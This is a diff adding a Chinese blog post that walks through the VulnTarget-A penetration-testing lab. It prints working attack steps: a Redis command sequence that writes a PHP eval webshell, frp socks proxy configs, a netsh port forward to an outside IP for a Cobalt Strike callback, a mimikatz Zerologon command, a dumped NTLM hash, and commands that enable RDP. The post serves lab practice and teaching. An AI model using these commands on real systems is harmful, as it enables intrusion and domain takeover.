@@ -1,0 +1,344 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>VulnTarget-A打靶 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>VulnTarget-A打靶</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/6
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%89%93%E9%9D%B6/" style="color: #ff7d73">打靶</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="靶机搭建"><a href="#靶机搭建" class="headerlink" title="靶机搭建"></a>靶机搭建</h1><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>拓扑图如下</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405240759634.webp" alt="图片"></p>
+<p>其它东西作者都配好了 自己整一下网卡就行了</p>
+<span id="more"></span>
+
+<h1 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h1><h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>访问<a target="_blank" rel="noopener" href="http://192.168.45.135/">http://192.168.45.135/</a></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405251139108.png" alt="image-20240525113945445"></p>
+<p>通达OA</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405251148509.png" alt="image-20240525114844374"></p>
+<p>通过工具拿shell</p>
+<p>蚁剑连上去传马</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405251154781.png" alt="image-20240525115354741"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405251154365.png" alt="image-20240525115409330"></p>
+<p>net view一下 报错</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405251159787.png" alt="image-20240525115911752"></p>
+<p>那么对20段进行一个扫描</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831561.png" alt="image-20240525120122775"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405251201571.png" alt="image-20240525120157538"></p>
+<p>这里发现没有扫到99</p>
+<p>我们直接传个fscan试试</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405251213884.png" alt="image-20240525121308820"></p>
+<p>也是扫不出来</p>
+<p>arp -a 可以看见</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405251423767.png" alt="image-20240525142348489"></p>
+<p>猜测是不走icmp noping试试</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405281139520.png" alt="image-20240528113915400"></p>
+<p>可以扫到了</p>
+<p>那么cs启个sock4代理</p>
+<p>然后配置proxychain wget看看web是什么</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405280802854.png" alt="image-20240528080159761"></p>
+<p>HelloWorld 应该没啥用</p>
+<p>这里还有一个6379redis未授权</p>
+<p>我们先连上去</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831801.png" alt="image-20240528114732271"></p>
+<p>可以写计划任务反弹shell,也可以写webshell </p>
+<p>这里先换个代理 cs的老是断</p>
+<p>我们用frp</p>
+<pre><code class="ini">[common]
+server_addr = 
+server_port = 7000
+
+
+[socks5]                
+type = tcp              
+remote_port = 10080     
+plugin = socks5         
+</code></pre>
+<h3 id="websehll"><a href="#websehll" class="headerlink" title="websehll"></a>websehll</h3><p><code>python dirsearch.py -u http://10.0.20.99:80 --proxy=socks5://111.67.195.152:10080</code></p>
+<p>扫目录</p>
+<p>存在探针和phpinfo</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831807.png" alt="image-20240528125718402"></p>
+<p>通过phpinfo拿到绝对路径写webshell</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405281259275.png" alt="image-20240528125903244"></p>
+<pre><code class="bash">config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;
+set webshell &quot;&lt;?php eval($_POST[1]);?&gt;&quot;
+config set dbfilename shell.php
+save
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405281614646.png" alt="image-20240528161410536"></p>
+<h2 id="win2016"><a href="#win2016" class="headerlink" title="win2016"></a>win2016</h2><p>蚁剑过代理 传马</p>
+<p>在win7上做端口转发</p>
+<p><code>netsh interface portproxy add v4tov4 listenport=6666 listenaddress=0.0.0.0 connectaddress=111.67.195.152 connectport=6666</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202405291216399.png" alt="image-20240529121659360"></p>
+<p>配置对应的listener</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831452.png" alt="image-20240530173632096"></p>
+<p>运行后上线</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831435.png" alt="image-20240529121646292"></p>
+<h2 id="win2019"><a href="#win2019" class="headerlink" title="win2019"></a>win2019</h2><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>做一下主机发现</p>
+<p>只有一个110 (win2019)</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831465.png" alt="image-20240529130925699"></p>
+<p>存在域环境</p>
+<p>我们传个fscan扫扫看 没啥有用的信息 88做了个端口转发 看了下不是web</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831838.png" alt="image-20240529122141408"></p>
+<p>那还是先用frp给10段的流量代理出来 这里注意一下需要用netsh进行端口转发</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831901.png" alt="image-20240529125819280"></p>
+<pre><code class="ini">[common]
+server_addr = 10.0.20.98
+server_port = 7001
+
+
+[socks5]                
+type = tcp              
+remote_port = 10081     
+plugin = socks5         
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831906.png" alt="image-20240529132405237"></p>
+<p>发现是win2019</p>
+<p>查看域控计算机<code>net group &quot;domain controllers&quot; /domain</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831984.png" alt="image-20240529135847733"></p>
+<p>查看域控管理员<code>net group &quot;enterprise admins&quot; /domain</code></p>
+<p>查看域控ip <code>nsloopup win2019.vulntarget.com</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831399.png" alt="image-20240529140149380"></p>
+<p>通过CVE-2020-1472将密码置空</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py">https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py</a></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831501.png" alt="image-20240529132432065"></p>
+<p>这里用的这个脚本 但是好像失败了 这里直接用mimikatz</p>
+<p><code>mimikatz lsadump::zerologon /target:10.0.10.110 /account:win2019$</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831583.png" alt="image-20240529140558615"></p>
+<p>dumpsecret</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831669.png" alt="image-20240529142529586"></p>
+<p>通过psexec拿到域控</p>
+<p><code>aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831785.png" alt="image-20240529143028093"></p>
+<p>至此拿下2019的命令行</p>
+<h3 id="2019后续"><a href="#2019后续" class="headerlink" title="2019后续"></a>2019后续</h3><p><code>rdp</code></p>
+<p>通过john跑出Admin的密码<code>Admin@666</code> 有了密码那么就可以尝试rdp</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406060831828.png" alt="image-20240531114133949"></p>
+<pre><code class="cmd"> reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f
+  wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1
+  netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow
+    reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
